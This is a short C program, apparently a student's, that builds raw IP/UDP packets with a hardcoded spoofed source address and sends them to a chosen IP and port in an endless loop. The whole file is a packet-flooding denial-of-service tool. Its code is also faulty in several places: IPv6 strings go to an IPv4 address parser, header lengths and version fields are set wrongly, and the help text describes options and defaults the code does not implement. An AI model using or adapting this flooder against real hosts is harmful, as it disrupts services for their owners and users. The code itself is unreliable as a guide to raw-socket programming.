#include <stdio.h>
#include <string.h> 
#include <sys/socket.h>
#include <stdlib.h> 
#include <errno.h> 
#include <netinet/tcp.h>	
#include <netinet/ip.h>	
#include <netinet/udp.h> 
#include <netinet/in.h> 
#include <time.h>




unsigned short csum(unsigned short *ptr,int nbytes);
void send_tcp(char* destination_ip, int destination_port);
void send_udp(char* destination_ip, int destination_port);


char* destination_ip;
int destination_port;

//needed for checksum calculation
struct pseudo_header    
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	
	struct tcphdr tcp;
};

// the regular checksum
unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

int main(int argc,char* argv[])
{
	srand(time(0));
	int UDP_flag = 0;
	
	// [-t ip_address -p port_number] case
	if(argc == 5 && strcmp(argv[1], "-t") == 0 && strcmp(argv[3], "-p") == 0)
	{
		destination_ip = argv[2];
		destination_port = atoi(argv[4]);
		while(1)
		{
			send_udp(destination_ip, destination_port);
		}
	}
	
	// [-t ip_address] case
	else if(argc == 3 && strcmp(argv[1], "-t") == 0)
	{
		destination_ip = argv[2];
		destination_port = 443;
		while(1)
		{
			send_udp(destination_ip, destination_port);
		}
	}
	
	// [-p port_number] case
	else if(argc == 3 && strcmp(argv[1], "-p") == 0)
	{
		destination_ip = "::1";
		destination_port = atoi(argv[2]);
		while(1)
		{
			send_udp(destination_ip, destination_port);
		}
	}

	// [] case
	else if(argc == 1)
	{
		destination_ip = "::1";
		destination_port = 443;
		while(1)
		{
			send_udp(destination_ip, destination_port);
		}
	}
	else
	{
		printf("syntax Error. \n please insert '-t ip_address (optional) -p port_number (optional) -r (optional)' \n if not specified default ip_address is 127.0.0.1 and default port_number is 443 \n");
	}
	
	//printf("%s \n", destination_ip);
	//printf("%d \n", destination_port);
	//printf("%d \n", UDP_flag);
}

//Wrote by Roi Mash
void send_udp(char* destination_ip, int destination_port)
{
	int sd;
	sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sd == -1) 
	{
		fprintf(stderr,"socket() error, root ?\n");
	}
	
	char source_ip[32];
	strcpy(source_ip , "2001:db8:3333:4444:5555:6666:7777:8888");
	
	//ip\port source and destination
	unsigned long ip_src = inet_addr(source_ip);
	unsigned long ip_dst = inet_addr(destination_ip);
	unsigned short p_src = (unsigned short) 111;
	unsigned short p_dst = (unsigned short) destination_port;
	
	struct sockaddr_in sin;
 
	sin.sin_family = AF_INET;
	sin.sin_port = p_dst;
	sin.sin_addr.s_addr = ip_dst; // dst
	
	struct ip *ip;
	struct udphdr *udp;
	char *dgm, *data;
	
	int packet_size = sizeof(struct ip) + sizeof(struct udphdr) + 1;
	dgm = (char *) malloc(packet_size);
	ip = (struct ip *) dgm;
	udp = (struct udphdr *) (dgm + sizeof(struct ip));
	data = (char *) (dgm + sizeof(struct ip) + sizeof(struct udphdr));
	
	memset(dgm, 0, packet_size);
	memcpy((char *) data, "G", 1);
	
	int one = 1;
	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) == -1)
 	{
 		fprintf(stderr,"setsockopt()");
 		exit(-1);
 	}
 	
 	ip->ip_v = 6;
	ip->ip_hl = 5;
	ip->ip_tos = 0;  //0x08
	ip->ip_len = sizeof(packet_size);
	ip->ip_ttl = 255;
	ip->ip_off = 0;
	ip->ip_id = rand();
	ip->ip_p = IPPROTO_UDP;
	ip->ip_sum = 0; 
	ip->ip_src.s_addr = ip_src;
	ip->ip_dst.s_addr = ip_dst;
	
	udp->uh_sport = p_src;
	udp->uh_dport = p_dst;
	udp->uh_ulen = htons(sizeof(struct udphdr ) + 1);
	udp->uh_sum = 0;
	
	if (sendto(sd, dgm, packet_size, 0, (struct sockaddr *) &sin, sizeof(struct sockaddr)) < 0) 
	{
 		fprintf(stderr,"oops, sendto() error\n");
 	}
 	else
 	{
 		printf ("Packet was sent to %s and port %d \n", destination_ip, destination_port);
 	}
 	
 	free(dgm);
	close(sd);
}

